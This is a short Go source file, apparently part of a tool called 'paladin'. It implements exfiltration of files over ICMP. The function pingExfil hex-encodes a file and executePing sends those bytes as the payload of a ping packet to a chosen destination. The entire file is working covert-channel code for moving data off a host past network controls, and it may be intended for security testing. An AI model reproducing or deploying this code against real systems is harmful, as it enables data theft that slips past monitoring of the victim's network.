package cmd

import (

	"os"
	"net"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
	"github.com/Zeerg/paladin/log"


)
// executePing is a basic ping implementation
func executePing(targetIP string, fileBytes []byte) {
	c, err := icmp.ListenPacket("ip4:icmp", "0.0.0.0")
    check(err)
    defer c.Close()

    wm := icmp.Message{
        Type: ipv4.ICMPTypeEcho, Code: 0,
        Body: &icmp.Echo{
            ID: os.Getpid() & 0xffff, Seq: 1,
            Data: fileBytes,
        },
    }
    wb, err := wm.Marshal(nil)
    check(err)
    if _, err := c.WriteTo(wb, &net.IPAddr{IP: net.ParseIP(targetIP)}); err != nil {
        log.Fatalf("WriteTo err, %s", err)
    }
}

// pingExfil Sends a file over ping to a destination server
func pingExfil(destination, fileName string) {
    fileAsHex := hexEncode(fileName)
    log.Println(fileAsHex)
	executePing(destination, fileAsHex)
}
